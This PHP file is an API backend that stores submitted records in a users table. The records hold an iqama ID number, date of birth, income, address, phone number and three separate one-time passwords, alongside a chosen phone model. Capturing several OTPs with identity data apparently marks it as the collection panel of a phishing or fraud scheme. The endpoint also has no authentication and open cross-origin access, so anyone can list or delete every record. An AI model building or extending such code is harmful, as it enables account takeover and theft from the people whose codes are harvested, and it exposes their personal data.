<?php
require_once __DIR__ . '/../config/database.php';

header('Content-Type: application/json');
// Allow cross-origin requests from your frontend
header('Access-Control-Allow-Origin: *');  // Allow all domains (or specify your frontend domain)
header('Access-Control-Allow-Methods: GET, POST, DELETE');  // Allow these HTTP methods
header('Access-Control-Allow-Headers: Content-Type');  // Allow these headers (usually needed for POST/PUT requests)

// Handle pre-flight requests (for browsers)
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Route handling based on HTTP method
$method = $_SERVER['REQUEST_METHOD'];

switch ($method) {
    case 'GET':
        getUser();
        break;
    case 'POST':
        createUser();
        break;
    case 'DELETE':
        deleteUser();
        break;
    default:
        http_response_code(405); // Method Not Allowed
        echo json_encode(["error" => "Method not allowed"]);
        break;
}

function getUser() {
    global $pdo;
    
    if (isset($_GET['id'])) {
        $id = $_GET['id'];
        $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$id]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user) {
            echo json_encode($user);
        } else {
            http_response_code(404); // Not Found
            echo json_encode(["error" => "User not found"]);
        }
    } else {
        $stmt = $pdo->query("SELECT * FROM users");
        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
        echo json_encode($users);
    }
}

function createUser() {
    global $pdo;
    
    $data = json_decode(file_get_contents('php://input'), true);

    if (!isset($data['mobile_number'], $data['name'])) {
        http_response_code(400); // Bad Request
        echo json_encode(["error" => "Missing required fields"]);
        return;
    }

    $stmt = $pdo->prepare("INSERT INTO users (model, color, storage, date_of_birth, nationality, iqama_number, mobile_number, first_otp, name, monthly_income, city, address, second_otp, third_otp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->execute([
        $data['model'], $data['color'], $data['storage'], $data['date_of_birth'], $data['nationality'], $data['iqama_number'],
        $data['mobile_number'], $data['first_otp'], $data['name'], $data['monthly_income'], $data['city'], $data['address'],
        $data['second_otp'], $data['third_otp']
    ]);

    $newUserId = $pdo->lastInsertId();
    echo json_encode(["message" => "User created successfully", "id" => $newUserId]);
}

function deleteUser() {
    global $pdo;

    if (isset($_GET['id'])) {
        $id = $_GET['id'];
        $stmt = $pdo->prepare("DELETE FROM users WHERE id = ?");
        $stmt->execute([$id]);

        if ($stmt->rowCount() > 0) {
            echo json_encode(["message" => "User deleted successfully"]);
        } else {
            http_response_code(404); // Not Found
            echo json_encode(["error" => "User not found"]);
        }
    } else {
        http_response_code(400); // Bad Request
        echo json_encode(["error" => "User ID is required"]);
    }
}
?>
